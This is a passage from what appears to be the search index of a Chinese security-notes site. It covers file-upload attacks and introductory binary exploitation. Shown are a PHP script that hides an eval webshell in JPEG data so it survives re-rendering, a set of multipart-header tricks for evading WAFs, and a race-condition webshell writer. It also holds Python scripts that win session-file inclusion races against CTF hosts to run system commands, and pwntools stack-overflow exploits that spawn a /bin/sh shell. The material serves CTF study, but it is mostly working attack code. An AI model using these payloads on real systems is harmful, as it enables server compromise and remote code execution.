0xd9 , 0x43 , 0x5d , 0xfb , 0xae , 0xcc , 0x5a , 0x01 , 0xdc , 0x5a , 0x01 , 0xdc , 0xa3 , 0x9f , 0x67 , 0xa5 , 0xbe , 0x5f , 0x76 , 0x74 , 0x5a , 0x4c , 0xa1 , 0x3f , 0x7a , 0xbf , 0x30 , 0x6b , 0x88 , 0x2d , 0x60 , 0x65 , 0x7d , 0x52 , 0x9d , 0xad , 0x88 , 0xa1 , 0x66 , 0x44 , 0x50 , 0x33 ); $img = imagecreatetruecolor ( 32 , 32 ); for ( $y = 0 ; $y < sizeof ( $p ); $y += 3 ) { $r = $p [ $y ]; $g = $p [ $y + 1 ]; $b = $p [ $y + 2 ]; $color = imagecolorallocate ( $img , $r , $g , $b ); imagesetpixel ( $img , round ( $y / 3 ), 0 , $color ); } imagepng ( $img , '1.png' ); \u9700\u8981\u5b89\u88c5php\u7684gd\u5e93\uff0c\u4f7f\u7528\u547d\u4ee4 sudo apt-get install php-gd \u8fdb\u884c\u5b89\u88c5\uff0c\u7136\u540e\u8fd0\u884c php \u56fe\u7247\u4e8c\u6b21\u6e32\u67d3.php \uff0c\u751f\u6210 1.png jpg\u7684\u4e8c\u6b21\u6e32\u67d3\u811a\u672c\u5982\u4e0b\uff1a <?php $miniPayload = '<?=eval($_POST[1]);?>' ; if ( ! extension_loaded ( 'gd' ) || ! function_exists ( 'imagecreatefromjpeg' )) { die ( 'php-gd is not installed' ); } if ( ! isset ( $argv [ 1 ])) { die ( 'php jpg_payload.php <jpg_name.jpg>' ); } set_error_handler ( \"custom_error_handler\" ); for ( $pad = 0 ; $pad < 1024 ; $pad ++ ) { $nullbytePayloadSize = $pad ; $dis = new DataInputStream ( $argv [ 1 ]); $outStream = file_get_contents ( $argv [ 1 ]); $extraBytes = 0 ; $correctImage = TRUE ; if ( $dis -> readShort () != 0xFFD8 ) { die ( 'Incorrect SOI marker' ); } while (( ! $dis -> eof ()) && ( $dis -> readByte () == 0xFF )) { $marker = $dis -> readByte (); $size = $dis -> readShort () - 2 ; $dis -> skip ( $size ); if ( $marker === 0xDA ) { $startPos = $dis -> seek (); $outStreamTmp = substr ( $outStream , 0 , $startPos ) . $miniPayload . str_repeat ( \" \\0 \" , $nullbytePayloadSize ) . substr ( $outStream , $startPos ); checkImage ( '_' . $argv [ 1 ], $outStreamTmp , TRUE ); if ( $extraBytes !== 0 ) { while (( ! $dis -> eof ())) { if ( $dis -> readByte () === 0xFF ) { if ( $dis -> readByte !== 0x00 ) { break ; } } } $stopPos = $dis -> seek () - 2 ; $imageStreamSize = $stopPos - $startPos ; $outStream = substr ( $outStream , 0 , $startPos ) . $miniPayload . substr ( str_repeat ( \" \\0 \" , $nullbytePayloadSize ) . substr ( $outStream , $startPos , $imageStreamSize ), 0 , $nullbytePayloadSize + $imageStreamSize - $extraBytes ) . substr ( $outStream , $stopPos ); } elseif ( $correctImage ) { $outStream = $outStreamTmp ; } else { break ; } if ( checkImage ( 'payload_' . $argv [ 1 ], $outStream )) { die ( 'Success!' ); } else { break ; } } } } unlink ( 'payload_' . $argv [ 1 ]); die ( 'Something\\'s wrong' ); function checkImage ( $filename , $data , $unlink = FALSE ) { global $correctImage ; file_put_contents ( $filename , $data ); $correctImage = TRUE ; imagecreatefromjpeg ( $filename ); if ( $unlink ) unlink ( $filename ); return $correctImage ; } function custom_error_handler ( $errno , $errstr , $errfile , $errline ) { global $extraBytes , $correctImage ; $correctImage = FALSE ; if ( preg_match ( '/(\\d+) extraneous bytes before marker/' , $errstr , $m )) { if ( isset ( $m [ 1 ])) { $extraBytes = ( int ) $m [ 1 ]; } } } class DataInputStream { private $binData ; private $order ; private $size ; public function __construct ( $filename , $order = false , $fromString = false ) { $this -> binData = '' ; $this -> order = $order ; if ( ! $fromString ) { if ( ! file_exists ( $filename ) || ! is_file ( $filename )) die ( 'File not exists [' . $filename . ']' ); $this -> binData = file_get_contents ( $filename ); } else { $this -> binData = $filename ; } $this -> size = strlen ( $this -> binData ); } public function seek () { return ( $this -> size - strlen ( $this -> binData )); } public function skip ( $skip ) { $this -> binData = substr ( $this -> binData , $skip ); } public function readByte () { if ( $this -> eof ()) { die ( 'End Of File' ); } $byte = substr ( $this -> binData , 0 , 1 ); $this -> binData = substr ( $this -> binData , 1 ); return ord ( $byte ); } public function readShort () { if ( strlen ( $this -> binData ) < 2 ) { die ( 'End Of File' ); } $short = substr ( $this -> binData , 0 , 2 ); $this -> binData = substr ( $this -> binData , 2 ); if ( $this -> order ) { $short = ( ord ( $short [ 1 ]) << 8 ) + ord ( $short [ 0 ]); } else { $short = ( ord ( $short [ 0 ]) << 8 ) + ord ( $short [ 1 ]); } return $short ; } public function eof () { return ! $this -> binData || ( strlen ( $this -> binData ) === 0 ); } } ?> \u4e0d\u8fc7jpg\u56fe\u7247\u6210\u529f\u7387\u5f88\u4f4e\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u76f4\u63a5\u4f7f\u7528\u4e0b\u9762\u7684\u539f\u56fe \u8fd0\u884c\u811a\u672c php jpg\u56fe\u7247\u4e8c\u6b21\u6e32\u67d3.php 1.jpg \uff0c\u751f\u6210payload_1.jpg \u7136\u540e\u518d\u4e0a\u4f20payload_1.jpg\uff0cPOST\u4f20\u53c2\u5c31\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\u4e86","title":"\u4e8c\u6b21\u6e32\u67d3"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#waf","text":"\u53ea\u8981\u80fd\u7ed5\u8fc7WAF\uff0c\u5e76\u4e14\u4f20\u5230\u540e\u7aef\u8fd8\u80fd\u6267\u884c\uff0c\u4e0d\u4f1a500\u5c31\u884c \u4ee3\u7801\u5c42\u9762\u7684\u7ed5\u8fc7\u4f9d\u65e7\u6709\u6548","title":"WAF\u5c42\u9762"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_7","text":"Content-Disposition: form-data; name=\"file\"; filename=\"1.p hp\" Content-Disposition: form-data; name=\"file\"; file name=\"1.php\" Content-Disposition: form-data; name=\"file\"; filename= \"1.php\" #\u4e09\u79cd\u5747\u53ef","title":"\u6362\u884c\u7ed5\u8fc7"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_8","text":"Content-Disposition: form-data; name=\"file\"; filename===\"a.php\"","title":"\u591a\u4e2a\u7b49\u53f7\u7ed5\u8fc7"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_9","text":"Content-Disposition: form-data; aaaaaaaaaaaaaaaaaaaaa......aaaaaaaaaaaaaaaaaaaaa;name=\"file\"; filename=\"a.php\"","title":"\u589e\u5927\u6587\u4ef6\u5927\u5c0f"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_10","text":"Content-Disposition: form-data; name=file1; filename=a.php Content-Disposition: form-data; name='file1'; filename=\"a.php\"","title":"\u53bb\u6389\u6216\u66ff\u6362\u5f15\u53f7"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#filename","text":"Content-Disposition: form-data; name=\"file\"; filename= ; filename=\"a.php\"","title":"\u589e\u52a0filename\u5e72\u6270"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#waf_1","text":"\u6df7\u6dc6form-data Content-Disposition: name=\"file\"; filename=\"a.php\" \u53bb\u9664form-data Content-Disposition: AAAAAAAA=\"BBBBBBBB\"; name=\"file\"; filename=\"a.php\" \u66ff\u6362form-data\u4e3a\u5783\u573e\u503c Content-Disposition: form-data ; name=\"file\"; filename=\"a.php\" form-data\u540e\u52a0\u7a7a\u683c Content-Disposition: for+m-data; name=\"file\"; filename=\"a.php\" form-data\u4e2d\u52a0+ \u6df7\u6dc6ConTent-Disposition COntEnT-DIsposiTiOn: form-data; name=\"file\"; filename=\"a.php\" \u5927\u5c0f\u5199\u6df7\u6dc6 Content-Type: image/gif Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" \u8c03\u6362Content-Type\u548cConTent-Disposition\u7684\u987a\u5e8f Content-Type: image/gif Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" Content-Type: image/gif \u589e\u52a0\u989d\u5916\u7684\u5934 AAAAAAAA:filename=\"aaa.jpg\"; Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" Content-Type: image/gif \u589e\u52a0\u989d\u5916\u7684\u5934 Content-Length: 666 Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" Content-Type: image/gif \u589e\u52a0\u989d\u5916\u7684\u5934","title":"\u6df7\u6dc6waf\u5339\u914d\u5b57\u6bb5"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_11","text":"\u5b89\u5168\u72d7\u603b\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u4e2d\u7684\u503c\u505a\u4e3a\u63a5\u6536\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4e00\u4e9b\u4e2d\u95f4\u4ef6\u4f8b\u5982IIS6.0\u603b\u662f\u4ee5\u7b2c\u4e00\u4e2aContent-Disposition\u4e2d\u7684\u503c\u505a\u4e3a\u63a5\u6536\u53c2\u6570\u3002","title":"\u53cc\u6587\u4ef6\u7ed5\u8fc7"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#wafboundary","text":"Content-Type: multipart/form-data; boundary=---------------------------471****1141173****525****99 Content-Length: 253 -----------------------------471****1141173****525****99 Content-Disposition: form-data; name=\"file1\"; filename=\"shell.asp\" Content-Type: application/octet-stream <%eval request(\"a\")%> -----------------------------471****1141173****525****99-- \u4e00\u4e9bWAF\u4f1a\u8ba4\u4e3a\u4e24\u6bb5Boundary\u4e0d\u4e00\u81f4\u7684\u6570\u636e\u662f\u65e0\u610f\u4e49\u7684\uff0c\u4e0d\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u5bb9\u5668\u5e76\u6ca1\u6709\u4e25\u683c\u8981\u6c42\uff0c\u6b63\u5e38\u63a5\u6536\u6570\u636e\u3002","title":"\u5bb9\u5668\u4e0eWAF\u5bf9Boundary\u8981\u6c42\u89c4\u5219\u4e0d\u4e00\u81f4"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_12","text":"\u4e00\u4e9b\u60c5\u51b5\u4e0b\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u5148\u4e0a\u4f20\u5230\u4e34\u65f6\u76ee\u5f55\uff0c\u7136\u540e\u518d\u68c0\u6d4b\uff0c\u68c0\u6d4b\u5230\u518d\u5220\u9664 \u53ef\u4ee5\u4e0a\u4f20\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c\u7684\u6587\u4ef6\uff1a fputs(fopen('shell6666.php','w'),' <?php @ eval ( $_POST [ 1 ]) ?> '); \u4e0a\u4f20\u540c\u65f6\u75af\u72c2\u91cd\u590d\u53d1\u5305\u8bbf\u95ee\u6b64\u6587\u4ef6\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a\u5728\u6587\u4ef6\u88ab\u5220\u9664\u4e4b\u524d\u751f\u6210webshell\u6587\u4ef6 shell6666.php","title":"\u6761\u4ef6\u7ade\u4e89"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#session","text":"session\u6587\u4ef6\u5305\u542b \uff0c\u5148\u4e86\u89e3\u4e00\u4e9b\u77e5\u8bc6\u70b9\uff0c\u5728php5.4\u4e4b\u540ephp.ini\u5f00\u59cb\u6709\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879 1.session.upload_progress.enabled = on 2.session.upload_progress.cleanup = on 3.session.upload_progress.prefix = \u201cupload_progress_\u201d 4.session.upload_progress.name = \u201cPHP_SESSION_UPLOAD_PROGRESS\u201d 5.session.use_strict_mode=off \u7b2c\u4e00\u4e2a\u8868\u793a\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d \u7b2c\u4e8c\u4e2a\u8868\u793a\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9 \u7b2c\u4e09\u548c\u7b2c\u56db\u4e2a prefix+name \u5c06\u8868\u793a\u4e3asession\u4e2d\u7684\u952e\u540d \u7b2c\u4e94\u4e2a\u8868\u793a\u6211\u4eec\u5bf9Cookie\u4e2dsessionID\u53ef\u63a7 \u6211\u4eec\u53ef\u4ee5\u5229\u7528 session.upload_progress \u5c06\u6728\u9a6c\u5199\u5165session\u6587\u4ef6\uff0c\u7136\u540e\u5305\u542b\u8fd9\u4e2asession\u6587\u4ef6\u3002\u4e0d\u8fc7\u524d\u63d0\u662f\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2asession\u6587\u4ef6\uff0c\u5e76\u4e14\u77e5\u9053session\u6587\u4ef6\u7684\u5b58\u653e\u4f4d\u7f6e\u3002\u56e0\u4e3a session.use_strict_mode=off \u7684\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49sessionID linux\u7cfb\u7edf\u4e2dsession\u6587\u4ef6\u4e00\u822c\u7684\u9ed8\u8ba4\u5b58\u50a8\u4f4d\u7f6e\u4e3a /tmp \u6216 /var/lib/php/session \u4f8b\u5982\u6211\u4eec\u5728Cookie\u4e2d\u8bbe\u7f6e\u4e86PHPSESSID=flag\uff0cphp\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u6587\u4ef6\uff1a/tmp/sess_flag\uff0c\u5373\u4f7f\u6b64\u65f6\u7528\u6237\u6ca1\u6709\u521d\u59cb\u5316session\uff0cphp\u4e5f\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\u3002 \u5e76\u4ea7\u751f\u4e00\u4e2a\u952e\u503c\uff0c\u4e3a prefix+name \u7684\u503c\uff0c\u6700\u540e\u88ab\u5199\u5165sess_\u6587\u4ef6\u91cc \u8fd8\u6709\u4e00\u4e2a\u5173\u952e\u70b9\u5c31\u662f session.upload_progress.cleanup \u9ed8\u8ba4\u662f\u5f00\u542f\u7684\uff0c\u53ea\u8981\u8bfb\u53d6\u4e86post\u6570\u636e\uff0c\u5c31\u4f1a\u6e05\u9664\u8fdb\u5ea6\u4fe1\u606f\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u6761\u4ef6\u7ade\u4e89\u6765pass\uff0c\u5199\u4e00\u4e2a\u811a\u672c\u6765\u5b8c\u6210 import io import requests import threading url = 'http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/' def write ( session ): data = { 'PHP_SESSION_UPLOAD_PROGRESS' : '<?php system(\"tac f*\");?>dotast' } while True : f = io . BytesIO ( b 'a' * 1024 * 10 ) response = session . post ( url , cookies = { 'PHPSESSID' : 'flag' }, data = data , files = { 'file' : ( 'dota.txt' , f )}) def read ( session ): while True : response = session . get ( url + '?file=/tmp/sess_flag' ) if 'dotast' in response . text : print ( response . text ) break else : print ( 'retry' ) if __name__ == '__main__' : session = requests . session () write = threading . Thread ( target = write , args = ( session ,)) write . daemon = True write . start () read ( session ) \u7136\u540e\u6211\u4eec\u8bf4\u5230**session\u6587\u4ef6\u4e0a\u4f20**\uff0c\u8fd8\u662f\u4e00\u6837\u5148\u4e0a\u4f20 .user.ini \uff0c\u5185\u5bb9\u4e3a GIF89a auto_prepend_file = /tmp/sess_muma \u63a5\u7740\u518d\u8fd0\u884c\u811a\u672c\u5373\u53ef import io import requests import threading url = 'http://3238a505-5728-4702-b83b-98460ec17f8d.chall.ctf.show:8080/' def write ( session ): data = { 'PHP_SESSION_UPLOAD_PROGRESS' : '<?php system(\"tac ../f*\");?>' } while True : f = io . BytesIO ( b 'GIF89a \\n dotast' ) files = { 'file' : ( '1.png' , f , 'image/png' )} response = session . post ( url + \"upload.php\" , cookies = { 'PHPSESSID' : 'muma' }, data = data , files = files ) def read ( session ): while True : response = session . get ( url + 'upload' ) # payload_url = target_url + '?file=' + '/tmp/sess_' + session_id \u7531\u4e8e\u4f20\u4e86.user.ini\u4e86\uff0c\u4e0d\u9700\u8981\u6307\u5b9a\u6240\u9700\u5305\u542b\u7684\u6587\u4ef6\u4e86 if 'ctfshow' in response . text : print ( response . text ) break else : print ( 'retry' ) if __name__ == '__main__' : session = requests . session () for i in range ( 30 ): threading . Thread ( target = write , args = ( session ,)) . start () for i in range ( 30 ): threading . Thread ( target = read , args = ( session ,)) . start ()","title":"Session\u7ade\u4e89"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/","text":"PWN\u5165\u95e8 \u00b6 \u4ecb\u7ecd \u00b6 objdump\uff1a objdump -d -M intel ./bof readelf\uff1a readelf -a ./bof IDA Pro GDB-PEDA\uff1achecksec\u3001vmmap\u3001find \u76f4\u63a5\u8fd0\u884c gdb ./pwn python\u901a\u8fc7pwn process\u8fd0\u884c\uff0cdebug\u6a21\u5f0f\u80fd\u770b\u5230\u8fdb\u7a0b\u53f7\uff0c\u7136\u540e gdb attach 6223 \u63a5\u7ba1\u8c03\u8bd5 \u8fdb\u5165pwndbg\u540e\u53ef\u4ee5\u4f7f\u7528 stack 30 \u3001 x/40sx 0x7ffd65627058 \u7b49\u547d\u4ee4 Pwntools\uff1a from pwn import * context . log_level = 'debug' #context(arch = 'i386', os = 'linux') p = remote ( 'x.x.x.x' , 23333 ) #p = process('./hello') addr = 0x400586 payload = 'a' * 0x18 + p64 ( addr ) p . sendline ( payload ) #p.send(asm(shellcraft.sh())) p . interactive () \u5e38\u7528\u65b9\u6cd5\uff1a p64 ( int ) 0xfaceb00c => ' \\x0c\\xb0\\xce\\xfa\\x00\\x00\\x00\\x00 ' u64 ( str ) ' \\x0c\\xb0\\xce\\xfa\\x00\\x00\\x00\\x00 ' => 0xfaceb00c p32 ( int ) 0xfaceb00c => ' \\x0c\\xb0\\xce\\xfa ' u32 ( str ) ' \\x0c\\xb0\\xce\\xfa ' => 0xfaceb00c remote ( host , port ) / process ( path ) . recv ( int ) 7 => Hello world ! => 'Hello w' . recvuntil ( str ) 'or' => Hello world ! => 'Hello wor' . recvline () === . recvuntil ( ' \\n ' ) . send ( str ) 'payload' => 'payload' . sendline ( str ) 'payload' => 'payload \\n ' . interactive () \u4e8c\u8fdb\u5236\u683c\u5f0f \u00b6 rodata\uff1aread only data\uff0c\u9759\u6001\u8d44\u6e90\uff0c\u5e38\u91cf\u3001\u5b57\u7b26\u4e32\u7b49 got\uff1a\u4e00\u4e2a\u5b57\u5178\uff0c\u5b58\u4e86\u6bcf\u4e2a\u51fd\u6570\uff08\u5305\u62ec\u5e93\u51fd\u6570\uff09\u7684\u5730\u5740 bss\uff1a\u5168\u5c40\u53d8\u91cf\u5b58\u50a8\u5728\u6b64\uff0c\u4e34\u65f6\u53d8\u91cf\u5b58\u5728\u6808\u4e2d\uff0c\u4f1a\u968f\u7740\u6808\u6d88\u5931 text\uff1a\u4ee3\u7801\u6bb5\uff08\u4ee3\u7801\u7684\u6c47\u7f16\u6307\u4ee4\uff09 \u51fd\u6570\u8c03\u7528\u4f20\u53c2 \u00b6 X64 \u00b6 \u8ddf\u636e\u51fd\u6570\u53c2\u6570\u4ece\u5de6\u5230\u53f3\u7684\u987a\u5e8f\uff0c\u5728\u8c03\u7528\u51fd\u6570\u524d\u9700\u5c06\u4e34\u65f6\u53d8\u91cf\u6309\u987a\u5e8f\u5b58\u5165**\u5bc4\u5b58\u5668**\uff1a rdi, rsi, rdx, rcx, r8, r9 \u591a\u4f59\u7684\u4e34\u65f6\u53c2\u6570\u5c06\u4ece\u540e\u5f80\u524d\u4f9d\u6b21\u653e\u5165\u6808\u4e2d\uff08\u5148\u8fdb\u540e\u51fa\uff09 \u5c06\u51fd\u6570\u7684**\u8fd4\u56de\u5730\u5740\u5b58\u5165rax** X86 \u00b6 32\u4f4d\u4f20\u53c2\u662f**\u4e0d\u4f7f\u7528\u5bc4\u5b58\u5668**\u7684\uff0c\u5168\u9760\u6808\u50a8\u5b58\u53c2\u6570\uff0c\u5373\uff1a push 0x800 push 0x700 push 0x600 push 0x500 push 0x400 push 0x300 push 0x200 push 0x100 call foo \u5e76\u4e1464\u4f4d\u6808\u5bbd\u5ea6\u662f8\u5b57\u8282(16\u4f4d)\uff0c\u800c32\u4f4d\u6808\u5bbd\u5ea6\u662f4\u5b57\u8282 \u6808\u683c\u5f0f \u00b6 \u51fd\u6570\u8c03\u7528 \u00b6 \u5f53\u524d\u6808\u7a7a\u95f4\u7ed3\u679c\uff0c\u51c6\u5907\u6267\u884ccall\u51fd\u6570 \u6ce8\u610f\uff1a rip\u7684\u503c\u6307\u5411\u4e0b\u4e00\u6761\u6c47\u7f16\u547d\u4ee4 \u6267\u884c\u5230call\u51fd\u6570\uff0c\u9996\u5148\u4fee\u6539rip\u7684\u503c\uff0c\u5e76\u4e14\u5c06call\u7684\u4e0b\u4e00\u6761\u547d\u4ee4\u7684\u5730\u5740\u5165\u6808\uff08\u4e3a\u4e86ret\u65f6\u5019\u8df3\u56de\u5230\u76f8\u5e94\u4f4d\u7f6e\uff09 \u7136\u540e\u6b63\u5f0f\u8fdb\u5165\u51fd\u6570\uff0c\u9996\u5148\u8fd8\u662f\u901a\u7528\u65b9\u6cd5\u5f00\u8f9f\u6808\u7a7a\u95f4 4004e7: push rbp 4004e8: mov rbp, rsp 4004eb: sub rsp, 0x10 \u7b2c\u4e00\u6b65\uff1a\u5c06\u539f\u5730\u5740\u6808\u5e95rbp\u5165\u6808 \u7b2c\u4e8c\u6b65\uff1a\u5c06\u65b0\u6808\u9876\u6307\u9488\u6307\u5411\u5f53\u524d\u6808\u5e95\u6307\u9488 \u7b2c\u4e09\u6b65\uff1a\u5c06\u6808\u9876\u6307\u9488\u4e0a\u79fb\uff0c\u5f00\u8f9f\u51fa0x10\uff0c\u537316\u5b57\u8282\u7a7a\u95f4 \u6700\u540e\u5c31\u53ef\u4ee5\u5f80\u5f00\u8f9f\u7684\u7a7a\u95f4\u91cc\u5199\u5165\u51fd\u6570\u5c40\u90e8\u53d8\u91cf\u4e86 \u51fd\u6570\u8fd4\u56de \u00b6 \u6267\u884c\u5b8c\u51fd\u6570\u903b\u8f91\uff0c\u901a\u5e38\u901a\u8fc7leave\u3001ret\u8fd4\u56de\u5230\u4e3b\u51fd\u6570 \u9996\u5148\u662fleave\uff0c\u867d\u7136\u6c47\u7f16\u5c31\u4e00\u884c\uff0c\u4f46\u5176\u5b9e\u672c\u8d28\u4e0a\u6267\u884c\u4e86 mov rsp, rbp pop rbp \u7b2c\u4e00\u6b65\uff1a\u6e05\u7a7a\u6808\u7a7a\u95f4\uff0c\u5c06\u6808\u9876\u6307\u9488\u6307\u5411\u6808\u5e95 \u7b2c\u4e8c\u6b65\uff1a\u5c06\u5f39\u51fa\u7684\u503c\u8d4b\u7ed9rbp\uff0c\u6240\u4ee5\u73b0\u5728\u6808\u5e95\u6307\u5411\u6700\u521d\u7684\u6808\u5e95 \u7136\u540e\u6267\u884cret\uff0c\u5373pop\u5f53\u524d\u6808\u9876\u7684\u503c\u81f3rip \u7531\u4e8erip\u4e3a\u4e0b\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\uff0c\u90a3\u4e48\u5c31\u521a\u597d\u56de\u5230\u4e3b\u51fd\u6570call\u7684\u540e\u9762\u4e86 \u6808\u6ea2\u51fa \u00b6 \u6240\u4ee5\u5982\u679c\u51fd\u6570\u4e34\u65f6\u53d8\u91cf\u7684\u503c\u53ef\u4ee5\u8f93\u5165\uff0c\u5e76\u4e14\u8d85\u4e86\u6240\u5206\u914d\u7684\u6808\u7a7a\u95f4 \u5982\u679c\u6211\u4eec\u80fd\u8986\u76d6\u5230rip\u7684\u503c\uff08\u8fd4\u56de\u5730\u5740\uff09\uff0c\u5c31\u80fd\u52ab\u6301\u6267\u884c\u6d41 Return to Text \u00b6 \u5373\u8fd4\u56de\u7684\u6307\u9488\u6307\u5411\u5230Text\u6bb5\uff0c\u901a\u5e38\u4e3a\u540e\u95e8\u51fd\u6570 \u8986\u76d6\u53d8\u91cf\u5f00\u8f9f\u7684\u7a7a\u95f4+8\u5b57\u8282\u7684old rbp \u6700\u540e\u52a0\u8fdb\u53bb\u540e\u95e8\u51fd\u6570\u5730\u5740\u5373\u53ef from pwn import * io = process ( './bof' ) backdoor = 0x400607 io . recvuntil ( 'TEXT:' ) payload = b 'a' * 0x18 + p64 ( backdoor ) io . sendline ( payload ) io . interactive () Return to Shellcode \u00b6 \u8fd9\u6b21\u6ca1\u6709\u73b0\u6210\u7684\u540e\u95e8\u51fd\u6570\u4e86\uff0c\u53ea\u80fd\u6211\u4eec\u81ea\u5df1\u627e\u4e00\u5757**\u540c\u65f6\u53ef\u8bfb\u53ef\u5199**\u7684\u5730\u5740\u5199\u5165shellcode \u7136\u540e\u8986\u76d6\u8fd4\u56de\u5730\u5740\u81f3\u6211\u4eec\u7684shellcode\u5373\u53ef \u4e00\u822cshellcode\u8c03\u7528execve\u51fd\u6570 int execve ( const char * filename , char * const argv [], char * const envp []); \u6839\u636e\u51fd\u6570\u4f20\u53c2\u65b9\u5f0f\uff1a \u7b2c\u4e00\u4e2a\u53d8\u91cffilename\u5b58\u5728rdi\u4e2d\uff0c\u8d4b\u503c\u4e3a /bin/sh \u7684\u5730\u5740 \u7b2c\u4e8c\u4e2a\u53d8\u91cfargv\u5b58\u5728rsi\u4e2d\uff0c\u8d4b\u503c\u4e3a0x0 \u7b2c\u4e09\u4e2a\u53d8\u91cfenvp\u5b58\u5728rdx\u4e2d\uff0c\u8d4b\u503c\u4e3a0x0 \u6700\u540e\u8c03\u7528syscall\u524d\u9700\u6307\u660e\u9700\u8981\u8c03\u7528\u7684\u51fd\u6570\uff0c\u901a\u8fc7\u67e5**Linux\u7cfb\u7edf\u8c03\u7528\u8868**(system call table)\uff0c0x3b\u4ee3\u8868syscall\uff0c\u6240\u4ee5\u9700\u8981\u7ed9rax\u8d4b\u503c\u4e3a0x3b \u5373\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a 0x h s / n i b / mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall \u4f8b\uff1a\u5141\u8bb8\u5f80bss\u6bb5\u5168\u5c40\u53d8\u91cf\u5199\u5165\uff0c\u4ee5\u53ca\u5c40\u90e8\u53d8\u91cf\u5b58\u5728\u6808\u6ea2\u51fa from pwn import * io = process ( './ret2sc' ) context . arch = 'amd64' shellcode_addr = 0x601060 sc = asm ( shellcraft . sh ()) io . recvuntil ( 'quanju:' ) io . send ( sc ) #\u5f80bss\u6bb5\u5199shellcode io . recvuntil ( 'linshi:' ) payload = b 'a' * 0x18 + p64 ( shellcode_addr ) io . sendline ( payload ) #\u8986\u76d6\u8fd4\u56de\u5730\u5740\u8df3\u5230shellcode io . interactive () bss\u6bb5\u5373\u53ef\u5199\u53c8\u53ef\u6267\u884c\uff0c\u524d\u63d0\u662f\u6ca1\u5f00NX \u6808\u4fdd\u62a4\u65b9\u6cd5 \u00b6 Canary \u00b6 \u5728old rbp\u524d\u52a0\u5165\u968f\u673a\u6570\uff0c\u6808\u56de\u6536\u65f6\u68c0\u67e5\u8be5\u6570\u662f\u5426\u88ab\u7be1\u6539 